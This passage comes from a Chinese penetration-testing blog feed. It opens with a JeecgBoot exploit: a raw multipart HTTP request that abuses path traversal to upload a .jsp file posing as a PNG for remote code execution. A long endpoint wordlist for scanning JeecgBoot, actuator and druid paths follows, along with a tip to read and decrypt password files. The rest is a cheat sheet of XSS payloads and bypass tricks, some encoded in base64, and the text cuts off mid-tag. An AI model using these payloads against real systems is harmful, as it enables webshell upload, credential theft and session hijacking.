接口进行文件上传攻击实现远程代码执行。</p><p>POST &#x2F;jeecg-boot&#x2F;api&#x2F;..&#x2F;commonController.do?parserXml HTTP&#x2F;1.1<br>Host:<br>Accept-Encoding: gzip, deflate<br>Content-Length: 360<br>User-Agent: Mozilla&#x2F;2.0 (compatible; MSIE 3.01; Windows 95<br>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundarygcflwtei<br>Connection: close</p><p>——WebKitFormBoundarygcflwtei<br>Content-Disposition: form-data; “name&#x3D;”name”</p><p>zW9YCa.png<br>——WebKitFormBoundarygcflwtei<br>ontent-Disposition: form-data; name&#x3D;”documentTitle”</p><p>blank<br>——WebKitFormBoundarygcflwtei<br>Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”zW9YCa.jsp”<br>Content-Type: image&#x2F;png</p><p>11111<br>——WebKitFormBoundarygcflwtei–</p></blockquote><h2 id="jeecg-boot字典扫描"><a href="#jeecg-boot字典扫描" class="headerlink" title="jeecg-boot字典扫描"></a>jeecg-boot字典扫描</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/v2/api-docs<br><span class="hljs-regexp">/jeecg-boot/online</span><span class="hljs-regexp">/cgform/head</span><span class="hljs-regexp">/fileTree?_t=1632524014&amp;parentPath=/</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/user/query</span>SysUser?username=admin<br><span class="hljs-regexp">/jeecg/</span><br><span class="hljs-regexp">/api/sys</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/user</span><br><span class="hljs-regexp">/v</span>2/api-docs<br><span class="hljs-regexp">/swagger-ui.html</span><br><span class="hljs-regexp">/env</span><br><span class="hljs-regexp">/actuator</span><br><span class="hljs-regexp">/mappings</span><br><span class="hljs-regexp">/metrics</span><br><span class="hljs-regexp">/beans</span><br><span class="hljs-regexp">/configprops</span><br><span class="hljs-regexp">/actuator</span><span class="hljs-regexp">/metrics</span><br><span class="hljs-regexp">/actuator</span><span class="hljs-regexp">/mappings</span><br><span class="hljs-regexp">/actuator</span><span class="hljs-regexp">/beans</span><br><span class="hljs-regexp">/actuator</span><span class="hljs-regexp">/configprops</span><br><span class="hljs-regexp">/actuator</span><span class="hljs-regexp">/httptrace</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/index.html</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/sql.html</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/weburi.html</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/websession.html</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/weburi.json</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/websession.json</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/login.html</span><br><span class="hljs-regexp">/api</span><span class="hljs-regexp">/config/list</span><br><span class="hljs-regexp">/sys/user</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/user/add</span><br><span class="hljs-regexp">/sys/user</span><span class="hljs-regexp">/edit</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/user/query</span>ById<br><span class="hljs-regexp">/sys/user</span><span class="hljs-regexp">/changePassword</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/role/list</span><br><span class="hljs-regexp">/sys/role</span><span class="hljs-regexp">/add</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/role/edit</span><br><span class="hljs-regexp">/sys/role</span><span class="hljs-regexp">/queryPermission</span><br><span class="hljs-regexp">/v</span>2/api-docs<br><span class="hljs-regexp">/v1/api</span>-docs<br><span class="hljs-regexp">/api-docs</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/menu/list</span><br><span class="hljs-regexp">/sys/menu</span><span class="hljs-regexp">/add</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/menu/edit</span><br><span class="hljs-regexp">/sys/menu</span><span class="hljs-regexp">/delete</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/depart/list</span><br><span class="hljs-regexp">/sys/depart</span><span class="hljs-regexp">/add</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/depart/edit</span><br><span class="hljs-regexp">/sys/depart</span><span class="hljs-regexp">/delete</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/list</span><br><span class="hljs-regexp">/online/cgform</span><span class="hljs-regexp">/add</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/edit</span><br><span class="hljs-regexp">/online/cgform</span><span class="hljs-regexp">/delete</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/fields</span><span class="hljs-regexp">/&#123;tableName&#125;</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/table</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/table</span><span class="hljs-regexp">/sync</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/generate</span>Code<br><span class="hljs-regexp">/sys/dict</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/dict/add</span><br><span class="hljs-regexp">/sys/dict</span><span class="hljs-regexp">/edit</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/dict/delete</span><br><span class="hljs-regexp">/act/process</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/act</span><span class="hljs-regexp">/process/deploy</span><br><span class="hljs-regexp">/act/task</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/act</span><span class="hljs-regexp">/task/complete</span><br><span class="hljs-regexp">/act/task</span><span class="hljs-regexp">/history</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/common/upload</span><br><span class="hljs-regexp">/sys/common</span><span class="hljs-regexp">/download/</span>&#123;fileId&#125;<br><span class="hljs-regexp">/sys/common</span><span class="hljs-regexp">/view/</span>&#123;fileId&#125;<br><span class="hljs-regexp">/monitor/redis</span><span class="hljs-regexp">/info</span><br><span class="hljs-regexp">/monitor</span><span class="hljs-regexp">/server/info</span><br><span class="hljs-regexp">/api/test</span><span class="hljs-regexp">/demo/list</span><br><span class="hljs-regexp">/api/test</span><span class="hljs-regexp">/demo/add</span><br><span class="hljs-regexp">/sys/log</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/log/delete</span><br><span class="hljs-regexp">/sys/sms</span><span class="hljs-regexp">/send</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/sms/list</span><br><span class="hljs-regexp">/api/test</span><span class="hljs-regexp">/demo/edit</span><br><span class="hljs-regexp">/api/test</span><span class="hljs-regexp">/demo/delete</span><br><span class="hljs-regexp">/report/load</span>Report/&#123;code&#125;<br><span class="hljs-regexp">/chart/api</span><span class="hljs-regexp">/getChartData</span><br><span class="hljs-regexp">/api</span><span class="hljs-regexp">/test/demo</span><span class="hljs-regexp">/queryById</span><br><span class="hljs-regexp">/act</span><span class="hljs-regexp">/process/delete</span><br><span class="hljs-regexp">/sys/dict</span><span class="hljs-regexp">/loadDictItems/</span>&#123;dictCode&#125;<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/getLoginQrcode</span><br><span class="hljs-regexp">/jeecg</span>-boot/sys/getQrcodeToken<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/login</span><br><span class="hljs-regexp">/jeecg</span>-boot/sys/phoneLogin<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/scanLoginQrcode</span><br><span class="hljs-regexp">/jeecg</span>-boot/drag/onlDragDataSource/add<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDataSource/delete</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDataSource/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDataSource/edit</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDataSource/list</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDataSource/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/add</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/add</span>Group<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/del</span>DragDataSetHeadGroup<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/delete</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/edit</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/update</span>Group<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetParam/add</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetParam/delete</span><br><span class="hljs-regexp">/jeecg-boot/druid</span><span class="hljs-regexp">/login.html</span><br><span class="hljs-regexp">/jeecg</span>-boot/drag/onlDragDatasetParam/deleteBatch<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetParam/edit</span><br><span class="hljs-regexp">/jeecg-boot/actuator</span><span class="hljs-regexp">/httptrace</span><br><span class="hljs-regexp">/jeecg</span>-boot/drag/onlDragDatasetParam/list<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetParam/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/websocket/send</span>Data<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/check</span>ByCode<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/add</span>File<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/add</span>Text<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/delete</span>One<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/file</span>List<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/list</span>ByForm<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dictItem/dict</span>ItemCheck<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/duplicate/check</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/query</span>ByCode<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/quartzJob/pause</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/quartzJob/resume</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/randomImage/</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/query</span>ByCode<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/dynamic/test</span>1<br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/add</span><br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/delete</span><br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/edit</span><br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/list</span><br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/query</span>ById<br><span class="hljs-regexp">/sys/user</span><span class="hljs-regexp">/delete</span><br><span class="hljs-regexp">/jeecg</span>-boot/sys/user/addSysUserRole<br><span class="hljs-regexp">/sys/role</span><span class="hljs-regexp">/delete</span><br><span class="hljs-regexp">/user</span><span class="hljs-regexp">/register</span><br></code></pre></td></tr></table></figure><h2 id="Jeecg-Exploit"><a href="#Jeecg-Exploit" class="headerlink" title="Jeecg-Exploit"></a>Jeecg-Exploit</h2><p><img src="/../images/07c514aa-3a2b-40f8-8ae4-6cdbfb37bd5a.png" alt="07c514aa-3a2b-40f8-8ae4-6cdbfb37bd5a"></p><p>若sql注入漏洞但是无法getshell，可以另辟蹊径，直接读取密码文件然后进行解密。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/2025/06/08/xss/"/>
    <url>/2025/06/08/xss/</url>
    
    <content type="html"><![CDATA[<hr><hr><h1 id="XSS常用标签及绕过姿势"><a href="#XSS常用标签及绕过姿势" class="headerlink" title="XSS常用标签及绕过姿势"></a>XSS常用标签及绕过姿势</h1><h3 id="平台："><a href="#平台：" class="headerlink" title="平台："></a>平台：</h3><ol><li><a href="https://xssaq.com/">https://xssaq.com/</a></li><li><a href="https://xssjs.com/">https://xssjs.com</a></li></ol><h2 id="一、xss-常见标签语句"><a href="#一、xss-常见标签语句" class="headerlink" title="一、xss 常见标签语句"></a>一、xss 常见标签语句</h2><blockquote><h3 id="0x01-标签"><a href="#0x01-标签" class="headerlink" title="0x01.  标签"></a>0x01. <a> 标签</h3></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;test&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="hljs-attribute">autofocus</span>=<span class="hljs-string">&quot;&quot;</span>&gt;xss&lt;/a&gt; #重复x<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onclick</span>=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onmouseout</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/a&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="0x02-标签"><a href="#0x02-标签" class="headerlink" title="0x02. 标签"></a>0x02. <img>标签</h3></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=eval(&quot;alert(1)&quot;)&gt;<br>&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onmouseout</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="0x03-标签"><a href="#0x03-标签" class="headerlink" title="0x03. 标签"></a>0x03. <iframe>标签</h3></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;test&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;alert(document.cookie)&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="0x04-标签"><a href="#0x04-标签" class="headerlink" title="0x04.  标签"></a>0x04. <audio> 标签</h3></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br>&lt;audio&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/audio&gt;<br>&lt;audio controls <span class="hljs-attribute">onfocus</span>=eval(&quot;alert(&#x27;xss&#x27;);&quot;) <span class="hljs-attribute">autofocus</span>=<span class="hljs-string">&quot;&quot;</span>&gt;&lt;/audio&gt;<br>&lt;audio controls <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;&lt;/audio&gt;<br><br></code></pre></td></tr></table></figure><blockquote><h3 id="0x05-标签"><a href="#0x05-标签" class="headerlink" title="0x05. 标签"></a>0x05. <video>标签</h3></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;video <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br>&lt;video&gt;&lt;source <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/video&gt;<br>&lt;video controls <span class="hljs-attribute">onmouseover</span>=<span 